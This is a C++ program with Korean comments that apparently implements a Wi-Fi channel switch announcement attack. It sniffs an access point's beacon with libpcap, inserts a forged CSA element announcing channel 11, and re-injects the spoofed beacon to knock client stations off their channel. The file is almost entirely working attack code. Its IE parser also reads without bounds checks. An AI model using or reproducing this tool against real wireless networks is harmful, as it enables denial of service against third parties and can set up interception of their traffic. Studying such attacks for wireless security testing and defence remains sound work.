#include <iostream>
#include <pcap.h>
#include <cstring>
#include <vector>
#include <sstream>
#include <iomanip>
#include <cstdint>
#include <algorithm>

// --- 구조체 패킹 적용 ---
// Radiotap 헤더: 패킹 지시어를 사용하여 구조체 크기가 실제 필드 크기와 일치하도록 함
#pragma pack(push, 1)
class RadiotapHeader {
public:
    uint8_t version;
    uint8_t pad;
    uint16_t len;

    RadiotapHeader(const uint8_t* data) {
        version = data[0];
        pad     = data[1];
        len     = *((uint16_t*)(data + 2));
    }
};
#pragma pack(pop)

// IEEE 802.11 헤더: 패킹 적용 (고정 관리 프레임은 24바이트여야 함)
#pragma pack(push, 1)
class IEEE80211Header {
public:
    uint16_t frameControl;
    uint16_t durationID;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t sequenceControl;

    // raw 데이터에서 파싱
    void parse(const uint8_t* data) {
        frameControl    = *((uint16_t*)(data));
        durationID      = *((uint16_t*)(data + 2));
        memcpy(addr1, data + 4, 6);
        memcpy(addr2, data + 10, 6);
        memcpy(addr3, data + 16, 6);
        sequenceControl = *((uint16_t*)(data + 22));
    }
};
#pragma pack(pop)

// 단일 정보 요소(IE)를 표현하는 클래스
class InfoElement {
public:
    uint8_t id;
    uint8_t length;
    std::vector<uint8_t> data;

    InfoElement() : id(0), length(0) {}

    // raw 데이터로부터 파싱 (IE 시작 위치)
    // 파싱 후 IE 전체 크기는 2 + length
    size_t parse(const uint8_t* raw) {
        id     = raw[0];
        length = raw[1];
        data.resize(length);
        memcpy(data.data(), raw + 2, length);
        return 2 + length;
    }

    // CSA IE 생성 (예시: 태그 번호 0x25, 길이 3)
    static InfoElement createCSA(uint8_t newChannel, uint8_t switchCount) {
        InfoElement ie;
        ie.id = 0x25; // CSA 태그 번호
        ie.length = 3; // 예시 길이
        ie.data.push_back(0x01);    // 채널 전환 모드 (예: 1)
        ie.data.push_back(newChannel);    // 새 채널
        ie.data.push_back(switchCount);     // 채널 전환 카운트
        return ie;
    }
};

// Beacon Frame 클래스
class BeaconFrame {
public:
    IEEE80211Header header;
    uint8_t timestamp[8];
    uint16_t beaconInterval;
    uint16_t capabilities;
    // IE 순서를 보존하기 위해 std::vector 사용 (원래 순서 유지)
    std::vector<InfoElement> infoElements;

    // raw 데이터 파싱 (Radiotap 헤더 뒤부터 시작하는 beacon 프레임)
    void parse(const uint8_t* data, size_t len) {
        // IEEE 802.11 헤더 파싱
        header.parse(data);
        // 고정 필드 파싱: timestamp(8), beaconInterval(2), capabilities(2)
        memcpy(timestamp, data + sizeof(IEEE80211Header), 8);
        beaconInterval = *((uint16_t*)(data + sizeof(IEEE80211Header) + 8));
        capabilities   = *((uint16_t*)(data + sizeof(IEEE80211Header) + 10));

        // IE 파싱: 고정 필드 이후부터 시작 (offset = header + 12)
        size_t offset = sizeof(IEEE80211Header) + 12;
        while (offset < len) {
            InfoElement ie;
            size_t ieSize = ie.parse(data + offset);
            infoElements.push_back(ie);
            offset += ieSize;
        }
    }

    // CSA IE 삽입: 기존 IE 중 CSA IE가 있다면 업데이트하고, 없으면 적절한 위치에 삽입
    void insertCSA(uint8_t newChannel, uint8_t switchCount) {
        // 먼저 CSA IE(태그 0x25)가 이미 있는지 검색하여 있으면 업데이트
        for (auto &ie : infoElements) {
            if (ie.id == 0x25) { // CSA IE 태그 번호
                ie.data.clear();
                ie.data.push_back(0x01); // 채널 전환 모드
                ie.data.push_back(newChannel);
                ie.data.push_back(switchCount);
                return;
            }
        }
        
        // 없으면 새 CSA IE 생성
        InfoElement csaIE = InfoElement::createCSA(newChannel, switchCount);
        
        // 우선 DS Parameter Set IE(태그 0x03)를 찾는다.
        auto dsIt = std::find_if(infoElements.begin(), infoElements.end(), [](const InfoElement& ie) {
            return ie.id == 0x03;
        });
        
        if (dsIt != infoElements.end()) {
            // DS Parameter Set IE가 있으면 그 바로 뒤에 CSA IE를 삽입
            infoElements.insert(dsIt + 1, csaIE);
        } else {
            // DS Parameter Set IE가 없으면 태그번호 순서 기준으로 CSA IE(0x25)보다 큰 첫 IE 앞에 삽입
            auto posIt = std::find_if(infoElements.begin(), infoElements.end(), [&](const InfoElement& ie) {
                return ie.id > 0x25;
            });
            if (posIt != infoElements.end()) {
                infoElements.insert(posIt, csaIE);
            } else {
                // 만약 CSA IE보다 태그 번호가 큰 IE가 없으면 맨 뒤에 추가
                infoElements.push_back(csaIE);
            }
        }
    }


    // BeaconFrame을 raw 바이트 배열로 직렬화 (간략화)
    std::vector<uint8_t> buildFrame() {
        std::vector<uint8_t> frame;
        // IEEE80211Header 직렬화 (패딩 문제 없이 sizeof() 사용)
        frame.resize(sizeof(IEEE80211Header));
        memcpy(frame.data(), &header, sizeof(IEEE80211Header));

        // 고정 필드 직렬화: timestamp, beaconInterval, capabilities
        frame.insert(frame.end(), timestamp, timestamp + 8);
        uint16_t interval = beaconInterval;
        frame.insert(frame.end(), reinterpret_cast<uint8_t*>(&interval), reinterpret_cast<uint8_t*>(&interval) + 2);
        uint16_t cap = capabilities;
        frame.insert(frame.end(), reinterpret_cast<uint8_t*>(&cap), reinterpret_cast<uint8_t*>(&cap) + 2);

        // IE 직렬화 (원래 순서 유지)
        for (const auto& ie : infoElements) {
            frame.push_back(ie.id);
            frame.push_back(ie.length);
            frame.insert(frame.end(), ie.data.begin(), ie.data.end());
        }
        return frame;
    }
};

// 패킷 전송 함수 (새롭게 빌드한 프레임 전송)
void sendPacket(const std::string& dev, const std::vector<uint8_t>& packet) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev.c_str(), BUFSIZ, 1, 1000, errbuf);
    if (!handle) {
        std::cerr << "디바이스 " << dev << " 열기 실패: " << errbuf << std::endl;
        return;
    }
    std::cout << "packet size: " << int(packet.size()) << std::endl;
    for (size_t i = 0; i < packet.size(); i++) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)packet[i] << " ";
        if ((i + 1) % 16 == 0)
            std::cout << std::endl;
    }
    std::cout << "=========================\n";
    std::cout << std::dec << std::endl;
    if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0) {
        std::cerr << "패킷 전송 오류: " << pcap_geterr(handle) << std::endl;
    } else {
        std::cout << "패킷 전송 완료" << std::endl;
    }
    pcap_close(handle);
}

// broadcast 처리 함수 (unicast의 경우도 유사하게 적용 가능)
void processBroadcast(const std::string& dev, const uint8_t* rawPacket, size_t len, uint8_t newChannel, uint8_t switchCount) {
    std::cout << "========================================" << std::endl;
    std::cout << "패킷 수신: " << len << "바이트" << std::endl;
    for (size_t i = 0; i < len; i++) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)rawPacket[i] << " ";
        if ((i + 1) % 16 == 0)
            std::cout << std::endl;
    }
    std::cout << std::dec << std::endl;
    
    // Radiotap 헤더 파싱 및 실제 프레임 시작 오프셋 계산
    RadiotapHeader rtHeader(rawPacket);
    size_t offset = rtHeader.len;
    
    // 최소 길이 확인
    if (len < offset + sizeof(IEEE80211Header))
        return;

    // --- 보다 정교한 beacon frame 판별 --- 
    // IEEE 802.11 헤더의 frameControl 필드(2바이트)를 읽어, 관리 프레임(type 0) 및 beacon(subtype 8)인지 확인
    uint16_t fc = *((uint16_t*)(rawPacket + offset));
    uint8_t subtype = (fc >> 4) & 0x0F;
    uint8_t type = (fc >> 2) & 0x03;
    if (type != 0 || subtype != 8) {
        // beacon frame이 아니면 건너뜀
        return;
    }

    // beacon 프레임 파싱
    BeaconFrame beacon;
    beacon.parse(rawPacket + offset, len - offset);
    
    // (추가 검증: source address 비교 등 필요 시)
    
    // CSA IE 삽입 (기존 CSA IE가 있으면 업데이트, 없으면 추가)
    beacon.insertCSA(newChannel, switchCount);

    // BeaconFrame 직렬화 후, 원본 Radiotap 헤더와 합쳐 최종 패킷 생성
    std::vector<uint8_t> newPacket;
    newPacket.insert(newPacket.end(), rawPacket, rawPacket + rtHeader.len);
    std::vector<uint8_t> beaconFrame = beacon.buildFrame();
    newPacket.insert(newPacket.end(), beaconFrame.begin(), beaconFrame.end());

    // 패킷 전송
    sendPacket(dev, newPacket);
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "사용법: " << argv[0] << " <인터페이스> <apMAC> [<stationMAC>]" << std::endl;
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcapHandle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (!pcapHandle) {
        std::cerr << "pcap_open_live 실패: " << errbuf << std::endl;
        return -1;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const uint8_t* packet;
        int res = pcap_next_ex(pcapHandle, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            std::cerr << "pcap_next_ex 에러: " << pcap_geterr(pcapHandle) << std::endl;
            break;
        }

        // 최소 Radiotap 헤더 크기 확인
        if (header->caplen < sizeof(RadiotapHeader))
            continue;

        // Radiotap 헤더 파싱
        const RadiotapHeader* rt_hdr = reinterpret_cast<const RadiotapHeader*>(packet);
        uint16_t rt_len = rt_hdr->len;

        // 캡처된 길이가 Radiotap 헤더 + IEEE80211Header 크기보다 짧으면 스킵
        if (header->caplen < rt_len + sizeof(IEEE80211Header))
            continue;

        // IEEE80211 헤더 판별 (보다 정교하게 관리 프레임/Beacon 판별)
        uint16_t fc = *((uint16_t*)(packet + rt_len));
        uint8_t subtype = (fc >> 4) & 0x0F;
        uint8_t type = (fc >> 2) & 0x03;
        if (type != 0 || subtype != 8)
            continue;

        // beacon frame인 경우에만 처리 (CSA IE 삽입 후 전송)
        processBroadcast(argv[1], packet, header->caplen, 0x0b, 0x03);
        return 0;
    }

    pcap_close(pcapHandle);
    return 0;
}
